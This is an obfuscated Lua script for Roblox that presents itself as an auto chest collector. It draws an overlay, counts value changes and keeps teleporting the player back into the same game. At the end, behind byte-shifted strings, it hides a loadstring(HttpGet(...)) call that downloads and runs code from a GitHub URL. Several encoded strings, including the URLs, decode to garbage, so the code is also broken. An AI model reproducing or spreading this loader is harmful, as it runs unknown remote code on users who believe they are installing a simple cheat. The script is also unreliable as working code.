--👑 KITA AUTO COLLECT CHEST
local _1=function(s)local t={}for i=1,#s do t[i]=string.char(s:byte(i)-1)end return table.concat(t)end
local _2=game local _3=_1("\81\109\98\122\102\115\116")local _4=_2:GetService(_3)local _5=_4.LocalPlayer
local _6=_1("\109\112\98\101\116\117\115\106\111\104")local _7=_1("\104\98\110\102\60\73\117\117\113\72\102\117")

repeat task.wait() until _2:IsLoaded()

local _8=_1("\76\106\117\98\66\117\116\112\68\105\102\116\116\86\74")
if _5.PlayerGui:FindFirstChild(_8) then _5.PlayerGui[_8]:Destroy() end

local _9=120 local _10=180 local _11=30 local _12=0 local _13=false local _14=nil local _15=0 local _16=0 local _17=false

local _18=Instance.new(_1("\84\100\115\102\102\111\72\117\106"),_5.PlayerGui)_18.Name=_8 _18.ResetOnSpawn=false
local _19=Instance.new(_1("\74\109\98\104\102\77\98\99\102\109"),_18)_19.Size=UDim2.new(0,260,0,260)_19.Position=UDim2.new(0,20,0,70)_19.BackgroundTransparency=1 _19.ImageTransparency=0.3

task.spawn(function()
local _20=_1("\105\116\116\112\115\58\47\47\99\100\110\46\100\105\115\99\111\114\100\97\112\112\46\99\111\109\47\97\116\116\97\99\104\109\101\110\116\115\47\49\52\52\57\55\53\50\53\48\55\49\51\48\56\52\51\49\54\55\47\49\52\53\50\52\57\54\52\50\53\52\56\56\52\56\54\52\52\48\47\52\54\49\50\53\102\55\56\100\57\101\102\101\48\102\101\55\102\57\54\102\99\55\49\99\54\102\55\48\54\55\48\46\106\112\103")
local _21=_1("\76\106\117\98\81\112\115\117\115\98\106\117\47\113\111\104")if not isfile(_21) then pcall(function()writefile(_21,game:HttpGet(_20))end)end _19.Image=getcustomasset(_21)
end)

Instance.new(_1("\86\74\68\112\115\111\102\115"),_19).CornerRadius=UDim.new(0,15)
local _22=Instance.new(_1("\71\115\98\109\102"),_19)_22.Size=UDim2.new(1,0,1,0)_22.BackgroundColor3=Color3.fromRGB(0,0,0)_22.BackgroundTransparency=0.5 Instance.new(_1("\86\74\68\112\115\111\102\115"),_22).CornerRadius=UDim.new(0,15)

local function _23(p,t,c)
local l=Instance.new(_1("\85\102\121\117\77\98\99\102\109"),_19)l.Size=UDim2.new(1,-30,0,25)l.Position=p l.BackgroundTransparency=1 l.TextColor3=c l.TextSize=16 l.Font=Enum.Font.GothamBold l.Text=t l.ZIndex=5 return l
end

local _24=_23(UDim2.new(0,15,0,10),_1("\135\33\76\74\85\66\33\66\86\85\80\33\68\73\70\84\85"),Color3.fromRGB(0,255,170))
task.spawn(function()while task.wait()do local h=tick()%5/5 _24.TextColor3=Color3.fromHSV(h,1,1)end end)

local _25=_23(UDim2.new(0,15,0,55),_1("\85\83\66\78\71\33\85\73\66\73\74\33\71\112\113\33\115\102\98\109\46\46\46"),Color3.fromRGB(255,255,255))
local _26=_23(UDim2.new(0,15,0,90),_1("\83\122\116\111\110\104\59\33\49\33\48\33\47\33\49\51\49"),Color3.fromRGB(255,255,0))
local _27=_23(UDim2.new(0,15,0,125),_1("\68\66\77\33\67\74\70\79\33\76\70\85\60\33\69\112\113\33\115\102\98\109"),Color3.fromRGB(255,100,100))
local _28=_23(UDim2.new(0,15,0,160),_1("\85\80\79\72\33\72\74\70\83\59\33\49\57\49\116"),Color3.fromRGB(200,200,200))

function _29(r)
if _13 then return end _13=true _25.Text=_1("\159\33")..r while true do pcall(function()_2:GetService(_1("\85\102\109\102\113\112\115\117\84\102\115\119\106\104\102")):Teleport(_2.PlaceId,_5)end)task.wait(1.5)end
end

task.spawn(function()
local m=nil while not m do
local s=_5:FindFirstChild(_1("\109\102\98\101\102\114\116\117\98\117\115"))if s and(s:FindFirstChild(_1("\67\102\109\106"))or s:FindFirstChild(_1("\78\112\111\102\121")))then m=s:FindFirstChild(_1("\67\102\109\106"))or s:FindFirstChild(_1("\78\112\111\102\121"))_14=m.Value break end
for _,v in pairs(_5.PlayerGui:GetDescendants())do if v:IsA(_1("\85\102\121\117\77\98\99\102\109"))and v.Visible and v.Text:find("\37\37\36")then m=v _14=v.Text break end end task.wait(1)
end
_17=true _25.Text=_1("\85\83\66\78\71\33\85\73\66\73\74\33\68\66\79\33\82\86\70\85")
while task.wait(0.1)do if _13 then break end local c=(m:IsA(_1("\87\98\109\117\102\70\99\107\102\100\117")))and m.Value or m.Text
if c~=_14 then _12=_12+1 _26.Text=_1("\83\122\116\111\110\104\59\33").._12.._1("\33\47\33\49\51\49")_14=c _16=0 if _12>=_9 then _29(_1("\70\86\33\49\51\49\33\83\122\116\111\110\104\34"))break end end end
end)

task.spawn(function()
while task.wait(1)do if _13 then break end if _17 then
_15=_15+1 _16=_16+1 _28.Text=_1("\85\80\79\72\33\72\74\70\83\59\33")..math.max(0,_10-_15).._1("\116")
_27.Text=_1("\76\70\85\33\84\66\86\59\33")..math.max(0,_11-_16).._1("\116")
if _16>=_11 then _29(_1("\76\70\85\33\44\41\84\33\45\33\69\70\74\33\84\87"))break
elseif _15>=_10 then _29(_1("\73\70\85\33\49\57\48\84\33\45\33\69\70\74\33\84\87"))break end end end
end)

_2:GetService(_1("\72\117\106\84\102\115\119\106\104\102")).ErrorMessageChanged:Connect(function()_29(_1("\77\70\74\33\76\70\85\33\76\70\85\70\74"))end)

task.delay(1,function()
pcall(function()getfenv()[_6](_2[_7:split(":")[2]](_2,_1("\105\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\100\117\121\50\54\48\52\49\52\45\108\97\110\103\47\72\101\108\108\111\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\65\117\116\111\37\50\48\99\104\101\115\116")))()end)
end)
--Cày thuê đi bạn yêu
